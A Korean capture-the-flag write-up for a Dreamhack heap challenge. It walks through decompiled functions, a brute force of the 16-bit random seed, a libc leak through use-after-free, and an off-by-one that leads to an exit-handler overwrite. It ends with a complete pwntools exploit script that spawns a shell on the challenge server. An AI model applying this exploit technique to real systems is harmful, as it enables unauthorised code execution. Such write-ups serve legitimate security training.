```bash
root@csh:/home/csh# checksec prob
[*] '/home/csh/prob'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
```

시간 제한이 1분이다. for 문을 돌리기엔 굉장히 짧은 시간이다.

```C
unsigned __int64 init()
{
  unsigned __int16 buf; // [rsp+2h] [rbp-Eh] BYREF
  int fd; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  buf = 0;
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  ssignal(14, (__sighandler_t)handler);
  alarm(0x3Cu);
  fd = open("/dev/urandom", 0);
  if ( !fd )
    puts("Oh... Plz DM Admin");
  read(fd, &buf, 2uLL);
  srand(buf);
  close(fd);
  return v3 - __readfsqword(0x28u);
}
```
buf에 2바이트짜리 랜덤한 값을 입력받고, 그걸 srand에 넣는다. 시드값이 0~65535이므로 시드값 브루트포스가 시간 안에 가능하다. 이렇게 랜덤을 재현할 수 있다.

```C
unsigned __int64 __fastcall view_post(const char *a1)
{
  unsigned int v2; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("What you want post ?");
  printf("Which of Post > ");
  __isoc99_scanf("%d", &v2);
  if ( v2 < 0xA )
  {
    if ( *(_QWORD *)&a1[8 * v2 + 48] )
    {
      printf("\n%s\n", (const char *)(*(_QWORD *)&a1[8 * v2 + 48] + 8LL));
      puts("============================================");
      printf("%s : %s\n", a1, *((const char **)&unk_6060 + (int)v2));
    }
    else
    {
      puts("Ho.. There's Empty");
    }
  }
  else
  {
    puts("No.. We can have only 10 posts...");
  }
  return v3 - __readfsqword(0x28u);
}
```
view_post에서 post의 내용을 볼 수 있다.

```C
unsigned __int64 __fastcall save_post(const char *a1)
{
  unsigned int v2; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("Save the Post, Will you check in your archive");
  printf("Which of Post > ");
  __isoc99_scanf("%d", &v2);
  if ( v2 < 0xA )
  {
    if ( *(_QWORD *)&a1[8 * v2 + 48] )
    {
      if ( *(_QWORD *)&a1[8 * v2 + 128] )
      {
        puts("There's Not Empty!");
      }
      else
      {
        printf("\n%s\n", (const char *)(*(_QWORD *)&a1[8 * v2 + 48] + 8LL));
        puts("============================================");
        printf("%s : %s\n", a1, *((const char **)&unk_6060 + (int)v2));
        free(*((void **)&unk_6060 + (int)v2));
        free(*(void **)&a1[8 * v2 + 48]);
        *(_QWORD *)&a1[8 * v2 + 128] = *(_QWORD *)&a1[8 * v2 + 48];
        *(_QWORD *)&a1[8 * v2 + 48] = 0LL;
      }
    }
    else
    {
      puts("Ho.. There's Empty");
    }
  }
  else
  {
    puts("No.. We can have only 10 posts...");
  }
  return v3 - __readfsqword(0x28u);
}
```
save_post에서는 청크를 free 시키고 뒤쪽으로 옮긴다.

```C
unsigned __int64 __fastcall restore_post(__int64 a1)
{
  unsigned int v2; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("What you want restore post?");
  printf("Which of Post > ");
  __isoc99_scanf("%d", &v2);
  if ( v2 < 0xA )
  {
    if ( *(_QWORD *)(a1 + 8 * ((int)v2 + 6LL)) )
    {
      puts("There's Not Empty!");
    }
    else if ( *(_QWORD *)(a1 + 8 * ((int)v2 + 16LL)) )
    {
      *(_QWORD *)(a1 + 8 * ((int)v2 + 6LL)) = *(_QWORD *)(a1 + 8 * ((int)v2 + 16LL));
      *(_QWORD *)(a1 + 8 * ((int)v2 + 16LL)) = 0LL;
      **(_DWORD **)(a1 + 8 * ((int)v2 + 6LL)) = 2;
      strcpy((char *)(*(_QWORD *)(a1 + 8 * ((int)v2 + 6LL)) + 8LL), "Restore Post");
    }
    else
    {
      puts("Ho.. There's Empty");
    }
  }
  else
  {
    puts("No.. We can have only 10 posts...");
  }
  return v3 - __readfsqword(0x28u);
}
```
setting 내부에 있는 restore_post에서 아까 save_post에서 뒤쪽으로 옮겨놓은 청크를 다시 앞으로 옮긴다. 앞쪽에 청크 주소가 있으면 view_post로 내용을 볼 수 있으므로 libc_leak이 가능하다.

```C
int __fastcall change_profile(char *a1)
{
  puts("What's Your ID?");
  printf("> ");
  read(0, a1, 0xFuLL);
  puts("Change PW?");
  printf("> ");
  __isoc99_scanf("%32s", a1 + 16);
  getchar();
  puts("Okay, Task Complete");
  return printf("Hi! %s\n", a1);
}
```
scanf는 마지막 바이트를 널바이트로 바꾸기 때문에 off-by-one. 청크 주소가 있는 곳이 변조된다. 0번 청크 주소를 edit해서 title을 입력할 때 7번 청크 주소에 입력할 수 있다. 0 -> 7 -> (입력한 주소 + 8)의 형태로 참조한다. 마땅히 FSOP를 길게하고 싶진 않으니 exit handler overwrite를 하였다.(세 번만 덮으면 되서 딱히 문제는 안 되는데, 문제 출제자는 j_strlen overwrite로 해결했다고 하더라. 취향차이인 것 같다. 공부는 해봐야겠다.)

```python
from pwn import *
from tqdm import *
from ctypes import *

p = remote('host3.dreamhack.games', 21857)
l1 = CDLL('./libc.so.6')
l = ELF('./libc.so.6')

def login() -> int:
    p.sendlineafter(b'> ', b'1')
    p.sendafter(b'id > ', b'Igunis')
    p.sendafter(b'password > ', b'vhsjqmfwhgdk!')
    p.recvuntil(b'Here you auth code ')
    res = int(p.recvuntil(b',')[:-1], 10)
    p.sendlineafter(b'Auth Code > ', str(res).encode())
    return res

def posting(idx: int, title: bytes, ln: int, dt: bytes):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'> ', str(idx).encode())
    p.sendafter(b'> ', title)
    p.sendlineafter(b'> ', str(ln).encode())
    p.sendafter(b'going on? ', dt)

def view(idx: int):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'> ', str(idx).encode())
    res = p.recvline() + p.recvline() + p.recvline() + p.recvline()
    return res

def save(idx: int):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'> ', str(idx).encode())
    res = p.recvline() + p.recvline() + p.recvline() + p.recvline()
    return res

def setting():
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'You Have Restoration Key? ', str(int(l1.rand())).encode())

def quit():
    p.sendlineafter(b'>', b'6')

def set_restore(idx: int):
    setting()
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'> ', str(idx).encode())

def set_edit(idx: int, title: bytes, ln: int, dt: bytes):
    setting()
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'> ', str(idx).encode())
    p.sendafter(b'? ', title)
    rev = p.recvline()
    if b'Oh,,,,' in rev:  
        p.sendlineafter(b'? ', str(ln).encode())
    if b'Okay' not in rev:
        p.sendafter(b'? ', dt)

def set_profile(id: bytes, pw: bytes):
    setting()
    p.sendlineafter(b'> ', b'3')
    p.sendafter(b'> ', id)
    p.sendlineafter(b'> ', pw)

random_num = login()
for i in range(65536):
    l1.srand(i)
    random_num1 = int(l1.rand())
    if random_num == random_num1:
        print(f"seed = {i}")
        break

posting(0, b'a', 0x500, b'a')
posting(1, b'a', 0x500, b'a')
posting(2, b'a', 0x21, b'a')
save(1)
set_restore(1)
l.address = u64(view(1).split(b'\n')[3].split(b' ')[2].ljust(8, b'\x00')) - (0x7ffff7facce0 - 0x7ffff7d93000)
print(hex(l.address))
save(2)
set_restore(2)
heap_base = u64(view(2).split(b'\n')[3].split(b' ')[2].ljust(8, b'\x00')) << 12
print(hex(heap_base))
set_profile(b'a', b'a' * 0x20)

fs_base = 0x7ffff7d90740 - 0x7ffff7d93000
initial = 0x7ffff7fadf00 - 0x7ffff7d93000
system = l.sym['system']
binsh = list(l.search(b'/bin/sh'))[0]
set_edit(0, p64(l.address + fs_base + 0x30 - 8), 0x10, b'a')
set_edit(7, p64(0), b'0', b'a')

sys_rol = system << 0x11
sys_rol = (sys_rol & 0xffffffffffffffff) ^ (sys_rol >> 64)
set_edit(0, p64(l.address + initial + 0x18 - 8), 0x10, b'a')
set_edit(7, p64(sys_rol), b'0', b'a')

set_edit(0, p64(l.address + initial + 0x20 - 8), 0x10, b'a')
set_edit(7, p64(binsh), b'0', b'a')

quit()
p.interactive()
```